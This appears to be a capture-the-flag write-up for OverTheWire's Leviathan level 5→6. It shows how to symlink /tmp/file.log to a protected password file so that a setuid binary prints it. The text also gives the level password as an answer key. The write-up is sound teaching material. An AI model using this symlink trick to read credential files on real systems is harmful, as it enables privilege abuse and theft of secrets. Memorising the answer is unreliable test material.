# Leviathan Level 5 → 6

## Goal

`leviathan5`'s binary (`leviathan5`, in the home directory) tries to read a file at `/tmp/file.log` and print it back to you. It's setuid `leviathan6`, so when *it* opens `/tmp/file.log`, it does so with the permissions of `leviathan6`. If we make `/tmp/file.log` a symbolic link to the `leviathan6` password file, the binary happily prints the password.

## Concepts you'll learn

- Reusing the symlink-redirection idea from [Behemoth 4 → 5](../behemoth/level04.md), in a simpler form (no race required)
- The difference between a setuid binary's effective UID (what it uses for permission checks) and the caller's UID
- Inspecting a binary's file-open behaviour with `strace` or `ltrace`

## Walkthrough

### 1. See what the binary does

```bash
$ ls -l
-r-sr-x--- 1 leviathan6 leviathan5 ... leviathan5

$ ./leviathan5
Cannot find /tmp/file.log
```

It's looking for `/tmp/file.log`. Confirm with `strace`:

```bash
$ strace ./leviathan5 2>&1 | grep open
...
open("/tmp/file.log", O_RDONLY)    = -1 ENOENT (No such file or directory)
```

If that file were present and readable by the binary's effective user, it would be read.

### 2. Create the file as a symlink

```bash
$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
$ ls -l /tmp/file.log
lrwxrwxrwx 1 leviathan5 leviathan5 ... /tmp/file.log -> /etc/leviathan_pass/leviathan6
```

You (as `leviathan5`) cannot read `/etc/leviathan_pass/leviathan6` directly — the file is mode `0400` owned by `leviathan6`. But the **binary** you're about to run has effective UID `leviathan6`, so it can.

### 3. Run the binary

```bash
$ ./leviathan5
UgaoFee4li
```

That's it. Because the binary is setuid, its `open("/tmp/file.log", O_RDONLY)` succeeds: the kernel follows the symlink to `/etc/leviathan_pass/leviathan6`, and permission checks on the real file use the **effective** UID (`leviathan6`) — which owns the file and has read access.

### 4. Log in as leviathan6

```bash
$ ssh leviathan6@leviathan.labs.overthewire.org -p 2223
```

## The answer

The password for `leviathan6` is:

**`UgaoFee4li`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/leviathan/leviathan5.html>
